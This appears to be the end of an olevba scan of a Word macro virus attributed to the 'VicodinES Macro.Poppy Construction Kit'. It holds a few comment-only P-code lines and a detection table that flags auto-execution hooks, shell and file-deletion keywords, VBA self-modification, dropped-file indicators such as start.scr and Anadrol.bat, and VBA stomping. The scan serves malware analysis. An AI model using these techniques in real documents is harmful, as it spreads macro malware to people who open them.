' 	QuoteRem 0x0004 0x0034 "The VicodinES Macro.Poppy Construction Kit v2.0 Beta"
' Line #694:
' 	QuoteRem 0x0004 0x0034 "===================================================="
' Line #695:
' 	QuoteRem 0x0004 0x0019 "Code Written by VicodinES"
' Line #696:
' 	QuoteRem 0x0004 0x0034 "Poppy ID : 75637833-270   -\/-  Compatable with SR-1"
' Line #697:
' 	QuoteRem 0x0004 0x0000 ""
' Line #698:
' 	QuoteRem 0x0004 0x002C "           *v2.0 Beta is not in release yet*"
' Line #699:
' Line #700:
' 	EndSub 
' Line #701:
' Line #702:
' Line #703:
' Line #704:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |start.scr           |Executable file name                         |
|IOC       |Anadrol.bat         |Executable file name                         |
|IOC       |start.exe           |Executable file name                         |
|Hex String|ucx3                |75637833                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

